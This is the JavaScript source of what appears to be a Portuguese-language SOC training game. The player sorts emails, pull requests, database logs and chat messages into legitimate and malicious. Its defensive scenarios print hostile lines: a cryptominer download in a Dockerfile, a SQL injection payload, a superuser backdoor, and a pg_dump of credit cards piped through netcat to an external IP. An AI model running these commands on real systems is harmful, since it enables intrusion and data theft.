/**
 * TechCore Cyber SOC Simulator // 4 Shifts Full Campaign Engine
 * Turnos 1, 2, 3 e 4 com diálogos dinâmicos do CEO Rogério
 */

// Native Web Audio Synthesizer
class SoundEngine {
  constructor() {
    this.ctx = null;
    this.enabled = true;
  }

  init() {
    if (!this.ctx) {
      const AudioContext = window.AudioContext || window.webkitAudioContext;
      if (AudioContext) {
        this.ctx = new AudioContext();
      }
    }
  }

  playTone(freq, type = 'square', duration = 0.08, gainVal = 0.08) {
    if (!this.enabled) return;
    this.init();
    if (!this.ctx) return;

    try {
      const osc = this.ctx.createOscillator();
      const gain = this.ctx.createGain();
      osc.type = type;
      osc.frequency.setValueAtTime(freq, this.ctx.currentTime);
      gain.gain.setValueAtTime(gainVal, this.ctx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.0001, this.ctx.currentTime + duration);
      osc.connect(gain);
      gain.connect(this.ctx.destination);
      osc.start();
      osc.stop(this.ctx.currentTime + duration);
    } catch (e) {}
  }

  menuHover() { this.playTone(440, 'triangle', 0.04, 0.04); }
  click() { this.playTone(880, 'square', 0.05, 0.06); }
  speechAdvance() { this.playTone(660, 'square', 0.04, 0.05); }
  openMail() { this.playTone(587.33, 'triangle', 0.06, 0.05); }
  actionDone() {
    this.playTone(523.25, 'square', 0.06, 0.06);
    setTimeout(() => this.playTone(659.25, 'square', 0.08, 0.06), 60);
  }
  endFanfare() {
    this.playTone(523.25, 'square', 0.1, 0.08);
    setTimeout(() => this.playTone(659.25, 'square', 0.1, 0.08), 100);
    setTimeout(() => this.playTone(783.99, 'square', 0.1, 0.08), 200);
    setTimeout(() => this.playTone(1046.50, 'square', 0.25, 0.12), 300);
  }
}

const audio = new SoundEngine();

// ==========================================
// 4 COMPLETE SHIFTS DATA & NARRATIVES
// ==========================================
const CAMPAIGN_SHIFTS = [
  // ----------------------------------------------------
  // TURNO 1: Fundamentos de SOC, E-mails & PRs
  // ----------------------------------------------------
  {
    shiftNumber: 1,
    title: 'Turno 1: Fundamentos de TI & Engenharia Social',
    brandName: 'TechMail',
    brandIcon: '📨',
    url: 'https://mail.techcore.com/mail/u/0/#inbox',
    rulesSummary: `
      <div class="card-head">🛡️ REGRAS DO TURNO 1</div>
      <p><strong>E-mails Válidos:</strong><br><code>@techcore.com</code><br><code>@techcore-hr.com</code> (RH Oficial)</p>
      <p><strong>Repos Oficiais:</strong><br><code>core-api-v2</code>, <code>auth-service</code>, <code>deploy-pipeline</code></p>
    `,
    guideContent: `
      <div class="instructions-section">
        <h4>1. Projetos Oficiais no GitHub (@TechCore-Official)</h4>
        <ul>
          <li><code>core-api-v2</code>: API principal de pagamentos.</li>
          <li><code>auth-service</code>: Microsserviço de autenticação e JWT.</li>
          <li><code>deploy-pipeline</code>: Automação CI/CD de deploy.</li>
        </ul>
      </div>
      <div class="instructions-section">
        <h4>2. Domínios de E-mail Oficiais</h4>
        <ul>
          <li><code>@techcore.com</code>: Colaboradores gerais e TI.</li>
          <li><code>@techcore-hr.com</code>: <strong>APENAS</strong> Recursos Humanos.</li>
          <li><em class="text-danger">Golpes: @tech-core.com, @techcore-beneficios.com!</em></li>
        </ul>
      </div>
    `,
    ceoDialogues: [
      {
        step: 1,
        text: `
          <p>Olá, Analista! Seja bem-vindo à linha de frente da <strong>TechCore</strong>.</p>
          <p>Hoje iniciamos o <strong>Turno 1</strong> da nossa operação de segurança. Detectamos que criminosos estão tentando aplicar golpes de <strong>engenharia social</strong> e adulterar códigos da nossa organização.</p>
        `
      },
      {
        step: 2,
        text: `
          <p>Neste primeiro turno, sua estação monitora 3 canais essenciais:</p>
          <p>• 📨 <strong>TechMail:</strong> Inspecione links suspeitos e remetentes falsificados.</p>
          <p>• 🐙 <strong>GitHub:</strong> Audite diffs de Pull Requests em busca de código malicioso.</p>
          <p>• 🔐 <strong>TechAccess (IAM):</strong> Bloqueie pedidos de admin sem chamado aprovado.</p>
        `
      },
      {
        step: 3,
        text: `
          <p>Lembre-se: e-mails oficiais usam apenas <code>@techcore.com</code> e <code>@techcore-hr.com</code>.</p>
          <p>Durante o turno não haverá avisos se você acertou ou errou. Às <strong>18:00</strong> avaliaremos os resultados. Bom turno inicial!</p>
        `
      }
    ],
    scenarios: [
      {
        id: 's1-1',
        channel: 'email',
        time: '09:15',
        senderName: 'Marcos Silva (RH)',
        senderEmail: 'marcos.rh@techcore-beneficios.com',
        avatarChar: 'M',
        avatarColor: '#e91e63',
        subject: '[URGENTE] Atualização Obrigatória de Cadastro de Benefícios',
        snippet: 'Identificamos inconsistência no seu plano corporativo. Revalide suas credenciais no link...',
        meta: { 'De': 'Marcos Silva <marcos.rh@techcore-beneficios.com>', 'Para': 'voce@techcore.com', 'Data': '09:12', 'Segurança': 'SPF: NEUTRAL | DKIM: NONE' },
        body: `<p>Prezado colaborador,</p><div class="email-quote-box"><p>Identificamos inconsistência no seu plano de saúde. Revalide suas credenciais imediatamente no link abaixo:<br><code>https://portal-colaborador.techcore-beneficios.com/login-sso</code></p></div>`,
        inspector: { type: 'url', label: 'Inspeção de Link', dest: 'https://portal-colaborador.techcore-beneficios.com/login-sso', details: '⚠️ Domínio não oficial (@techcore-beneficios.com). O RH oficial usa apenas @techcore-hr.com.' },
        actions: [
          { id: 'a1', label: '🌐 Acessar Link e Inserir Credenciais', correct: false, toastMsg: 'Credenciais inseridas.', logTitle: 'Vazamento em Phishing', consequence: 'Você enviou credenciais corporativas a servidores de golpistas.', explanation: 'O domínio @techcore-beneficios.com é falso. O RH usa apenas @techcore-hr.com.' },
          { id: 'a2', label: '🛡️ Reportar Phishing ao SOC', correct: true, toastMsg: 'E-mail reportado.', logTitle: 'Phishing de RH Neutralizado', consequence: 'Domínio falso colocado na blacklist do firewall.', explanation: 'Excelente! Você verificou que o domínio não é oficial.' }
        ]
      },
      {
        id: 's1-2',
        channel: 'github',
        time: '11:00',
        senderName: 'carlos.dev (TechHub)',
        senderEmail: 'carlos.dev@techcore.com',
        avatarChar: 'C',
        avatarColor: '#2e7d32',
        subject: 'PR #142: Otimização de queries no endpoint de checkout PIX',
        snippet: 'Refatoração de índices e paginação no repositório oficial core-api-v2...',
        meta: { 'De': 'carlos.dev (Sênior)', 'Para': '@TechCore-Official / core-api-v2', 'Data': '10:55', 'Segurança': 'GPG Signature: VALID' },
        body: `<p>PR #142 no repositório <code>core-api-v2</code>:</p><div class="email-quote-box"><p>Adicionado índice na consulta de ordens PIX para reduzir latência de banco.</p></div>`,
        inspector: { type: 'diff', label: 'Git Diff (core-api-v2/src/pix.ts)', diff: [{ type: 'info', text: '@@ -45,4 +45,4 @@' }, { type: 'removed', text: '- const q = db.query("SELECT * FROM orders");' }, { type: 'added', text: '+ const q = db.query("SELECT id, amount, status FROM orders USE INDEX (idx_date)");' }] },
        actions: [
          { id: 'a1', label: '✅ Aprovar e Fazer Merge', correct: true, toastMsg: 'PR aprovado com sucesso.', logTitle: 'PR Legítimo Integrado', consequence: 'Deploy de pagamentos realizado com segurança.', explanation: 'Desenvolvedor oficial autorizado (carlos.dev) e repositório oficial core-api-v2.' },
          { id: 'a2', label: '❌ Rejeitar e Bloquear PR', correct: false, toastMsg: 'PR bloqueado.', logTitle: 'Falso Positivo em PR', consequence: 'Atraso indevido na entrega de features críticas.', explanation: 'carlos.dev é membro sênior oficial e o diff estava limpo.' }
        ]
      },
      {
        id: 's1-3',
        channel: 'iam',
        time: '13:30',
        senderName: 'alex.intern (TechAccess)',
        senderEmail: 'alex.intern@techcore.com',
        avatarChar: 'A',
        avatarColor: '#f57c00',
        subject: 'Solicitação de Privilégio: ClusterAdmin Kubernetes (Prod)',
        snippet: 'Preciso de permissão de admin root na nuvem de produção para debugar CSS...',
        meta: { 'De': 'alex.intern (Estagiário)', 'Para': 'TechAccess Approver', 'Data': '13:28', 'Segurança': 'Chamado: Nenhum' },
        body: `<p>Solicitação IAM:</p><div class="email-quote-box"><p>"Preciso de root na AWS e no Cluster Kubernetes de Produção para testar uma folha de estilos."</p></div>`,
        inspector: { type: 'url', label: 'Auditoria IAM', dest: 'alex.intern -> AWS ClusterAdmin (PROD)', details: '⚠️ Estagiário pedindo acesso root em produção sem chamado prévio de beatriz.sec.' },
        actions: [
          { id: 'a1', label: '🔓 Aprovar Permissão de Admin', correct: false, toastMsg: 'Admin concedido.', logTitle: 'Violação de Menor Privilégio', consequence: 'Acesso root liberado indevidamente em produção.', explanation: 'Nunca conceda privilégios de produção sem chamado de segurança prévio.' },
          { id: 'a2', label: '🚫 Rejeitar Solicitação', correct: true, toastMsg: 'Solicitação rejeitada.', logTitle: 'Acesso Indevido Barrado', consequence: 'Políticas de menor privilégio mantidas com sucesso.', explanation: 'Correto! Acessos administrativos em produção exigem aprovação formal.' }
        ]
      },
      {
        id: 's1-4',
        channel: 'email',
        time: '15:10',
        senderName: 'RH TechCore (Oficial)',
        senderEmail: 'comunicados@techcore-hr.com',
        avatarChar: 'R',
        avatarColor: '#1976d2',
        subject: 'Informativo: Escala de Férias e Ponto Eletrônico',
        snippet: 'Informamos que o espelho de ponto deste mês já está disponível na intranet habitual...',
        meta: { 'De': 'RH TechCore <comunicados@techcore-hr.com>', 'Para': 'todos@techcore.com', 'Data': '15:08', 'Segurança': 'SPF: PASS | DKIM: PASS' },
        body: `<p>Prezada equipe,</p><div class="email-quote-box"><p>O espelho de ponto está disponível na intranet corporativa. Não há nenhum link externo nesta mensagem.</p></div>`,
        inspector: { type: 'url', label: 'Inspeção de Cabeçalho', dest: '@techcore-hr.com (SPF/DKIM: PASS)', details: '✅ Canal oficial e exclusivo para comunicados de Recursos Humanos.' },
        actions: [
          { id: 'a1', label: '📨 Manter / Arquivar Comunicado', correct: true, toastMsg: 'Comunicado arquivado.', logTitle: 'Informativo de RH Processado', consequence: 'Comunicação interna mantida sem incidentes.', explanation: 'O domínio @techcore-hr.com é o canal oficial de RH.' },
          { id: 'a2', label: '🚨 Bloquear Domínio do RH', correct: false, toastMsg: 'Canal bloqueado.', logTitle: 'Falso Positivo em Canal de RH', consequence: 'Você bloqueou o canal legítimo de avisos da empresa.', explanation: '@techcore-hr.com está expressamente autorizado na Guia.' }
        ]
      },
      {
        id: 's1-5',
        channel: 'github',
        time: '17:20',
        senderName: 'shadow.dev (TechHub)',
        senderEmail: 'shadow.dev@external.net',
        avatarChar: 'S',
        avatarColor: '#616161',
        subject: 'PR #1: Adicionar container worker para relatórios noturnos',
        snippet: 'Criando repositório não oficial crypto-worker-node com container xmrig...',
        meta: { 'De': 'shadow.dev (Desconhecido)', 'Para': 'crypto-worker-node', 'Data': '17:15', 'Segurança': 'Repo NÃO OFICIAL' },
        body: `<p>PR #1 no repositório <code>crypto-worker-node</code>:</p><div class="email-quote-box"><p>Adicionando container de mineração oculto nos servidores.</p></div>`,
        inspector: { type: 'diff', label: 'Git Diff (crypto-worker-node/Dockerfile)', diff: [{ type: 'info', text: '@@ -1,2 +1,4 @@' }, { type: 'added', text: '+ RUN wget https://mine-pool.org/xmrig.tar.gz' }, { type: 'added', text: '+ ENTRYPOINT ["./xmrig", "-o", "stratum+tcp://mine-pool.org:3333"]' }] },
        actions: [
          { id: 'a1', label: '✅ Aprovar PR e Deploy', correct: false, toastMsg: 'Deploy realizado.', logTitle: 'Injeção de Cryptominer', consequence: 'Minerador de Monero implantado nos servidores da nuvem.', explanation: 'Repositório não oficial com comando explícito do minerador xmrig.' },
          { id: 'a2', label: '🚫 Fechar PR e Banir Usuário', correct: true, toastMsg: 'Ameaça banida.', logTitle: 'Cryptominer Bloqueado', consequence: 'Uso indevido de recursos da infraestrutura prevenido.', explanation: 'Excelente! Apenas core-api-v2, auth-service e deploy-pipeline são repositórios oficiais.' }
        ]
      }
    ]
  },

  // ----------------------------------------------------
  // TURNO 2: Auditoria de Banco de Dados & SQL (TechDB)
  // ----------------------------------------------------
  {
    shiftNumber: 2,
    title: 'Turno 2: Auditoria de Banco de Dados & SQL Injection',
    brandName: 'TechDB SQL',
    brandIcon: '🗄️',
    url: 'https://db-monitor.techcore.internal/audit/#sql-logs',
    rulesSummary: `
      <div class="card-head">🗄️ REGRAS DO TURNO 2 (BANCO DE DADOS)</div>
      <p><strong>Usuários Oficiais de DB:</strong><br><code>db_admin_prod</code>, <code>app_checkout_service</code></p>
      <p><strong>Proibido:</strong><br>DUMPS sem aprovação, <code>UNION SELECT</code> em endpoints e criação de SUPERUSER!</p>
    `,
    guideContent: `
      <div class="instructions-section">
        <h4>1. Políticas de Banco de Dados (TechDB)</h4>
        <ul>
          <li><code>db_admin_prod</code>: Usuário exclusivo da equipe de DBA interna.</li>
          <li><code>app_checkout_service</code>: Usuário da API de pagamentos (somente DML restrito).</li>
          <li><em class="text-danger">Ameaças: Queries com UNION SELECT, DROP TABLE, pg_dump de dados sensíveis para IPs externos.</em></li>
        </ul>
      </div>
    `,
    ceoDialogues: [
      {
        step: 1,
        text: `
          <p>Excelente trabalho no Turno 1! O CISO e eu estamos impressionados com a sua agilidade.</p>
          <p>No entanto, a equipe de inteligência detectou uma mudança de postura dos invasores: eles estão tentando atingir diretamente o nosso <strong>Banco de Dados de Produção (PostgreSQL)</strong>!</p>
        `
      },
      {
        step: 2,
        text: `
          <p>Neste <strong>Turno 2</strong>, liberamos o acesso ao módulo <strong>TechDB</strong> no seu desktop.</p>
          <p>Você terá que auditar consultas SQL em tempo real, pedidos de exportação de dados (DUMP) e tentativas de SQL Injection.</p>
        `
      },
      {
        step: 3,
        text: `
          <p><strong>Regras de Banco:</strong></p>
          <p>• Usuários autorizados: <code>db_admin_prod</code> e <code>app_checkout_service</code>.</p>
          <p>• Bloqueie qualquer tentativa de <code>UNION SELECT</code> em formulários de login, criação de novos superusuários ou exportação de senhas e dados de cartões!</p>
        `
      }
    ],
    scenarios: [
      {
        id: 's2-1',
        channel: 'db',
        time: '09:30',
        senderName: 'WAF / TechDB Monitor',
        senderEmail: 'waf-alert@techcore.internal',
        avatarChar: 'W',
        avatarColor: '#d93025',
        subject: '[ALERTA SQLi] Tentativa de Injeção em Endpoint de Login de Parceiros',
        snippet: 'Detectada query maliciosa no parâmetro email com UNION SELECT password_hash FROM users...',
        meta: { 'Origem': 'IP 185.220.101.44 (Tor Exit Node)', 'Endpoint': '/api/v1/auth/partner-login', 'Data': '09:28', 'Status': 'Bloqueado no WAF temporariamente' },
        body: `<p>Log de Consulta Suspeita interceptada no endpoint de autenticação:</p><div class="email-quote-box"><p>Payload recebido no campo de login:<br><code>' OR 1=1 UNION SELECT id, username, password_hash FROM admin_users --</code></p></div>`,
        inspector: { type: 'url', label: 'Auditoria de Query SQL', dest: 'SELECT * FROM partners WHERE email = \'\' OR 1=1 UNION SELECT id, username, password_hash FROM admin_users --', details: '🚨 Injeção SQL clássica tentando exfiltrar a tabela de senhas de administradores!' },
        actions: [
          { id: 'a1', label: '🛡️ Bloquear IP Permanentemente & Sanitizar Query', correct: true, toastMsg: 'Ataque de SQLi bloqueado.', logTitle: 'SQL Injection Neutralizada', consequence: 'IP malicioso banido no Cloudflare e vulnerabilidade de SQLi corrigida.', explanation: 'Identificação perfeita da tentativa de extração de senhas via UNION SELECT.' },
          { id: 'a2', label: '⚪ Ignorar como Falso Positivo', correct: false, toastMsg: 'Log ignorado.', logTitle: 'Vazamento de Hashes de Senhas', consequence: 'O invasor completou a injeção e extraiu todos os hashes de senha do banco.', explanation: 'UNION SELECT em formulário de autenticação é um ataque claro de SQLi.' }
        ]
      },
      {
        id: 's2-2',
        channel: 'db',
        time: '11:15',
        senderName: 'app_checkout_service (TechDB)',
        senderEmail: 'checkout-cron@techcore.internal',
        avatarChar: 'C',
        avatarColor: '#10b981',
        subject: 'Query Rotineira: Fechamento de Lote de Transações PIX',
        snippet: 'SELECT status, count(*), sum(amount) FROM pix_transactions WHERE created_at >= NOW() - INTERVAL 1 HOUR...',
        meta: { 'Usuário': 'app_checkout_service', 'Banco': 'techcore_payments_prod', 'Data': '11:12', 'Assinatura': 'Serviço Interno Autorizado' },
        body: `<p>Auditoria de Query de Aplicação:</p><div class="email-quote-box"><p>Consulta agendada de agregação financeira de transações concluídas nas últimas horas.</p></div>`,
        inspector: { type: 'url', label: 'Auditoria de Query SQL', dest: 'SELECT status, count(*), sum(amount) FROM pix_transactions WHERE created_at >= NOW() - INTERVAL \'1 hour\' GROUP BY status;', details: '✅ Consulta legítima de serviço autorizado (app_checkout_service) sem cláusulas perigosas.' },
        actions: [
          { id: 'a1', label: '✅ Autorizar Execução da Query', correct: true, toastMsg: 'Query autorizada.', logTitle: 'Operação de Banco Legítima', consequence: 'Fechamento financeiro horário concluído sem interrupção.', explanation: 'Query legítima de agregação executada pela conta autorizada app_checkout_service.' },
          { id: 'a2', label: '🚨 Matar Processo e Bloquear Usuário', correct: false, toastMsg: 'Processo encerrado.', logTitle: 'Falso Positivo em Serviço de Pagamentos', consequence: 'O checkout PIX da empresa parou de consolidar pagamentos de clientes.', explanation: 'app_checkout_service é o usuário oficial de pagamentos da TechCore.' }
        ]
      },
      {
        id: 's2-3',
        channel: 'db',
        time: '14:00',
        senderName: 'Auditor de Sessão Postgres',
        senderEmail: 'pg-audit@techcore.internal',
        avatarChar: 'P',
        avatarColor: '#f59e0b',
        subject: '[ALERTA CRÍTICO] Criação de Superusuário Não Autorizado no Banco',
        snippet: 'CREATE ROLE shadow_admin WITH SUPERUSER LOGIN PASSWORD "root_pwned_2026";...',
        meta: { 'Conexão': 'Sessão remota via porta 5432 exposta', 'Banco': 'techcore_main_db', 'Data': '13:58', 'Comando': 'DDL Privilege Escalation' },
        body: `<p>Comando DDL detectado nos logs de auditoria do banco principal:</p><div class="email-quote-box"><p><code>CREATE ROLE shadow_admin WITH SUPERUSER LOGIN PASSWORD 'root_pwned_2026';</code><br><code>GRANT ALL PRIVILEGES ON ALL TABLES TO shadow_admin;</code></p></div>`,
        inspector: { type: 'url', label: 'Inspeção de Privilégios DB', dest: 'CREATE ROLE shadow_admin WITH SUPERUSER', details: '🚨 Tentativa de persistência de backdoor criando um Superadmin no PostgreSQL!' },
        actions: [
          { id: 'a1', label: '🚫 Revogar Role, Fechar Porta 5432 e Trocar Senhas', correct: true, toastMsg: 'Backdoor no DB revogado.', logTitle: 'Backdoor no PostgreSQL Neutralizado', consequence: 'Role não autorizada removida e acesso direto ao banco restrito à VPN.', explanation: 'Tentativa gravíssima de criar um superusuário no banco de dados de produção.' },
          { id: 'a2', label: '✅ Aprovar Criação do Usuário', correct: false, toastMsg: 'Usuário criado.', logTitle: 'Comprometimento Total do Banco', consequence: 'O atacante assumiu o controle absoluto de todas as tabelas e dados da empresa.', explanation: 'Nunca aprove a criação de roles superuser sem chamado formal da gerência.' }
        ]
      },
      {
        id: 's2-4',
        channel: 'db',
        time: '15:45',
        senderName: 'db_admin_prod (DBA Oficial)',
        senderEmail: 'dba-team@techcore.com',
        avatarChar: 'D',
        avatarColor: '#0284c7',
        subject: 'Manutenção de Rotina: Reindexação e Vacuum na Tabela de Ordens',
        snippet: 'VACUUM ANALYZE orders; REINDEX TABLE CONCURRENTLY orders;...',
        meta: { 'Usuário': 'db_admin_prod', 'Chamado': '#DBA-4412 (Aprovado)', 'Data': '15:40', 'Janela': 'Manutenção Programada' },
        body: `<p>Execução de rotina de otimização de banco de dados:</p><div class="email-quote-box"><p><code>VACUUM ANALYZE orders;</code><br><code>REINDEX TABLE CONCURRENTLY orders;</code></p></div>`,
        inspector: { type: 'url', label: 'Inspeção de Manutenção DB', dest: 'VACUUM ANALYZE orders; REINDEX TABLE CONCURRENTLY orders;', details: '✅ Operação de manutenção padrão executada pelo usuário oficial db_admin_prod com chamado regular.' },
        actions: [
          { id: 'a1', label: '✅ Permitir Manutenção de Banco', correct: true, toastMsg: 'Manutenção autorizada.', logTitle: 'Otimização de DB Concluída', consequence: 'Índices reconstruídos e performance do banco restaurada.', explanation: 'Procedimento regular de DBA com usuário oficial e chamado aprovado.' },
          { id: 'a2', label: '🚫 Bloquear e Desconectar DBA', correct: false, toastMsg: 'DBA desconectado.', logTitle: 'Interrupção de Rotina de Manutenção', consequence: 'Tabelas ficaram fragmentadas causando lentidão no sistema.', explanation: 'db_admin_prod é o DBA oficial realizando manutenção com chamado registrado.' }
        ]
      },
      {
        id: 's2-5',
        channel: 'db',
        time: '17:10',
        senderName: 'Data Exfil Sensor',
        senderEmail: 'dlp-sensor@techcore.internal',
        avatarChar: 'D',
        avatarColor: '#e11d48',
        subject: '[VAZAMENTO EM ANDAMENTO] pg_dump de Cartões de Crédito para IP Externo',
        snippet: 'Comando pg_dump -t credit_cards | nc 198.51.100.99 4444 em execução...',
        meta: { 'Processo': 'pg_dump -t credit_cards', 'Destino': '198.51.100.99:4444', 'Data': '17:08', 'DLP Status': 'ALERTA MÁXIMO' },
        body: `<p>Processo de extração massiva de dados financeiros detectado:</p><div class="email-quote-box"><p><code>pg_dump -h localhost -U postgres -t credit_cards techcore_prod | nc 198.51.100.99 4444</code></p></div>`,
        inspector: { type: 'url', label: 'Inspeção de Exfiltração de Dados', dest: 'pg_dump credit_cards -> 198.51.100.99 (Rússia / Servidor C2)', details: '🚨 Exfiltração ativa de dados de cartões de crédito para servidor de comando e controle externo!' },
        actions: [
          { id: 'a1', label: '🚨 Matar Processo, Cortar Conexão de Rede e Isolar Servidor', correct: true, toastMsg: 'Exfiltração abortada.', logTitle: 'Vazamento de Cartões Interceptado', consequence: 'Conexão com IP do atacante cortada em menos de 10 segundos. Dados preservados.', explanation: 'Ação rápida e precisa para conter uma tentativa crítica de roubo de dados bancários.' },
          { id: 'a2', label: '⚪ Aguardar Término do Dump', correct: false, toastMsg: 'Dump finalizado.', logTitle: 'Vazamento Massivo de Cartões de Crédito', consequence: 'Milhares de cartões de clientes foram vazados e a empresa sofreu multas pesadas da LGPD.', explanation: 'pg_dump para IP externo via netcat é um clássico ataque de exfiltração.' }
        ]
      }
    ]
  },

  // ----------------------------------------------------
  // TURNO 3: Investigação de Contas & TechZap (WhatsApp)
  // ----------------------------------------------------
  {
    shiftNumber: 3,
    title: 'Turno 3: Contas Comprometidas & TechZap Chat',
    brandName: 'TechZap',
    brandIcon: '💬',
    url: 'https://techzap.techcore.internal/chat/#direct-messages',
    rulesSummary: `
      <div class="card-head">💬 REGRAS DO TURNO 3 (TECHZAP CHAT)</div>
      <p><strong>Gangue Cibernética Ativa:</strong><br>Contas de colegas foram invadidas via cookies roubados.</p>
      <p><strong>Como Identificar:</strong><br>Exija ID de crachá e valide projetos internos!</p>
    `,
    guideContent: `
      <div class="instructions-section">
        <h4>1. Validação de Identidade no TechZap</h4>
        <ul>
          <li><code>carlos.dev</code>: Crachá #DEV-042 (Projeto: core-api-v2).</li>
          <li><code>beatriz.sec</code>: Crachá #SEC-8921 (Projeto: auth-service).</li>
          <li><code>marcos.rh</code>: Crachá #RH-101 (Projeto: escala-rh).</li>
          <li><em class="text-danger">Se o contato errar o crachá ou pedir envio de senhas/chaves privadas, BLOQUEIE A CONTA!</em></li>
        </ul>
      </div>
    `,
    ceoDialogues: [
      {
        step: 1,
        text: `
          <p>Alerta vermelho, Analista! A situação ficou extremamente pessoal.</p>
          <p>Descobrimos que uma gangue cibernética conseguiu <strong>roubar cookies de sessão</strong> de alguns colaboradores da nossa empresa e está se passando por eles no chat interno!</p>
        `
      },
      {
        step: 2,
        text: `
          <p>Ativamos o <strong>TechZap (WhatsApp Corporativo)</strong> na sua estação de trabalho.</p>
          <p>Colaboradores entrarão em contato direto com você pedindo reset de 2FA, envio de senhas e liberação de VPN.</p>
        `
      },
      {
        step: 3,
        text: `
          <p><strong>Como descobrir se é o colaborador real ou um golpista:</strong></p>
          <p>• Colaboradores reais sabem o número do crachá e o código do projeto interno.</p>
          <p>• Golpistas usam urgência forçada, erram perguntas de segurança e pedem chaves privadas SSL por WhatsApp. Se for impostor, <strong>bloqueie a conta imediatamente</strong>!</p>
        `
      }
    ],
    scenarios: [
      {
        id: 's3-1',
        channel: 'zap',
        time: '09:40',
        senderName: 'carlos.dev (Via TechZap)',
        senderEmail: '+55 11 98765-4321',
        avatarChar: 'C',
        avatarColor: '#2e7d32',
        subject: '[CHAT TECHZAP] carlos.dev: "Preciso de reset do meu 2FA urgente!"',
        snippet: 'Oi cara, troquei de celular agora e perdi o 2FA. Pode desativar pra mim rapidão?...',
        meta: { 'Contato': 'carlos.dev (Sessão Web Nova)', 'Localização IP': 'São Petersburgo, Rússia', 'Data': '09:38', 'Crachá Informado': '#DEV-999 (ERRADO!)' },
        body: `
          <div class="techzap-chat-card">
            <div class="chat-bubble-incoming">
              <strong>carlos.dev:</strong><br>
              "Fala meu bom! Cara, comprei um celular novo no shopping e perdi o aplicativo de 2FA do autenticador. Desativa o 2FA da minha conta aí rapidão que preciso subir um deploy agora em 5 minutos!"
            </div>
            <div class="chat-bubble-challenge">
              <strong>Você (Analista):</strong> "Carlos, para sua segurança, confirme o número do seu crachá e seu projeto principal."<br>
              <strong>carlos.dev:</strong> "Ah pô, crachá é #DEV-999 e o projeto é crypto-worker! Libera logo mano, tô com pressa!"
            </div>
          </div>
        `,
        inspector: { type: 'url', label: 'Auditoria de Identidade do Contato', dest: 'IP: 185.220.101.9 (Rússia) | Crachá Informado: #DEV-999', details: '🚨 Impostor detectado! O crachá real de Carlos é #DEV-042 e seu repo é core-api-v2. A conta foi invadida!' },
        actions: [
          { id: 'a1', label: '🔒 Bloquear Conta de carlos.dev & Invalidar Todas as Sessões', correct: true, toastMsg: 'Conta comprometida bloqueada.', logTitle: 'Invasor em Conta de Carlos Neutralizado', consequence: 'Sessão roubada pelo invasor derrubada e conta corporativa protegida.', explanation: 'Excelente investigação! O golpista errou o crachá (#DEV-042) e o projeto.' },
          { id: 'a2', label: '🔓 Desativar 2FA e Liberar Acesso', correct: false, toastMsg: '2FA desativado.', logTitle: 'Conta Corporativa Entregue a Invasor', consequence: 'A gangue assumiu o controle total da conta de desenvolvedor sênior de Carlos.', explanation: 'O contato era um golpista com IP da Rússia e crachá falso.' }
        ]
      },
      {
        id: 's3-2',
        channel: 'zap',
        time: '11:50',
        senderName: 'beatriz.sec (Via TechZap)',
        senderEmail: '+55 11 97654-3210',
        avatarChar: 'B',
        avatarColor: '#00897b',
        subject: '[CHAT TECHZAP] beatriz.sec: "Confirmação de chave token para forense"',
        snippet: 'Oi Analista, estou conduzindo a investigação #SEC-8921. Segue meu crachá e token...',
        meta: { 'Contato': 'beatriz.sec (SecOps)', 'Localização IP': 'São Paulo, Brasil (VPN TechCore)', 'Data': '11:48', 'Crachá Informado': '#SEC-8921 (CORRETO)' },
        body: `
          <div class="techzap-chat-card">
            <div class="chat-bubble-incoming">
              <strong>beatriz.sec:</strong><br>
              "Olá Analista, sou a Beatriz de SecOps. Estou investigando a tentativa de brute force na API. Meu crachá é #SEC-8921 e meu projeto é auth-service. Pode validar meu token temporário de auditoria?"
            </div>
            <div class="chat-bubble-challenge">
              <strong>Você (Analista):</strong> "Validação automática de MFA: Código 482-910."<br>
              <strong>beatriz.sec:</strong> "Confirmado! Código 482-910 validado no meu app autenticador."
            </div>
          </div>
        `,
        inspector: { type: 'url', label: 'Auditoria de Identidade do Contato', dest: 'IP: 177.18.22.5 (SP/Brasil - VPN Interna) | Crachá: #SEC-8921', details: '✅ Colaboradora legítima! Dados de crachá, projeto e MFA validados perfeitamente.' },
        actions: [
          { id: 'a1', label: '✅ Confirmar Identidade e Validar Sessão', correct: true, toastMsg: 'Identidade de Beatriz validada.', logTitle: 'Colaboradora Legítima Confirmada', consequence: 'Investigação forense de Beatriz continuou sem atrasos.', explanation: 'Beatriz forneceu crachá correto (#SEC-8921), projeto correto e MFA válido.' },
          { id: 'a2', label: '🔒 Bloquear Beatriz por Engano', correct: false, toastMsg: 'Beatriz bloqueada.', logTitle: 'Falso Positivo em Analista de Segurança', consequence: 'A analista de SecOps teve seu acesso cortado durante uma auditoria crítica.', explanation: 'Beatriz cumpriu rigorosamente todos os protocolos de autenticação.' }
        ]
      },
      {
        id: 's3-3',
        channel: 'zap',
        time: '14:20',
        senderName: 'marcos.rh (Via TechZap)',
        senderEmail: '+55 11 96543-2109',
        avatarChar: 'M',
        avatarColor: '#e91e63',
        subject: '[CHAT TECHZAP] marcos.rh: "Me manda a chave privada SSL da empresa"',
        snippet: 'Um auditor do ministério está aqui e precisa da chave privada do certificado SSL agora...',
        meta: { 'Contato': 'marcos.rh (Sessão Anômala)', 'Localização IP': 'Bucareste, Romênia', 'Data': '14:18', 'Crachá Informado': 'Não soube responder' },
        body: `
          <div class="techzap-chat-card">
            <div class="chat-bubble-incoming">
              <strong>marcos.rh:</strong><br>
              "Oi colega da TI, estou numa reunião com auditores do Ministério do Trabalho e eles exigiram que você envie o arquivo private_key.pem do certificado SSL da empresa por aqui agora!"
            </div>
            <div class="chat-bubble-challenge">
              <strong>Você (Analista):</strong> "Marcos, o RH nunca lida com chaves SSL. Qual é o seu crachá corporativo?"<br>
              <strong>marcos.rh:</strong> "Não interessa o crachá! Sou gerente e se você não mandar vou te advertir por insubordinação!"
            </div>
          </div>
        `,
        inspector: { type: 'url', label: 'Auditoria de Engenharia Social', dest: 'IP: 194.102.23.1 (Romênia) | Solicitação: Chave Privada SSL', details: '🚨 Golpe clássico de chantagem e autoridade falsa! Chaves privadas SSL nunca são enviadas por chat.' },
        actions: [
          { id: 'a1', label: '🔒 Bloquear Conta Imediatamente & Alertar CISO', correct: true, toastMsg: 'Conta fraudulenta bloqueada.', logTitle: 'Tentativa de Roubo de Certificado SSL Barrada', consequence: 'Tentativa de extorsão e roubo de chaves criptográficas abortada.', explanation: 'Perfeito! Chaves SSL nunca devem ser compartilhadas por mensagens de chat.' },
